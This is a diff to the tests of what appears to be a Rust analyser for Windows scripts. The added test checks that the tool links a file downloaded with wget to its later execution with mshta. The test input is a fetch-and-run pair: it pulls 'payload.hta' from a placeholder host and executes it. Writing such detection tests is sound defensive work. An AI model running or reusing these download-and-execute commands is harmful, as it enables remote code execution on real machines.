@@ -6606,6 +6606,7 @@ mshta C:\Temp\stage.hta"#,
 
 #[cfg(test)]
 mod wget_tests {
+    use crate::analyze;
     use crate::env::{Config, Environment};
     use crate::interp::interpret_line;
     use crate::traits::Trait;
@@ -6666,6 +6667,28 @@ mod wget_tests {
         assert!(env
             .modified_filesystem
             .contains_key(r#"c:\temp\payload.bin"#));
+    }
+
+    #[test]
+    fn wget_default_output_tracks_url_basename_for_later_execution() {
+        let report = analyze(
+            br#"wget https://wget-default-output.example/payload.hta
+mshta payload.hta"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://wget-default-output.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "mshta local HTA did not resolve wget default-output download source: {:?}",
+            report.traits
+        );
     }
 
     #[test]
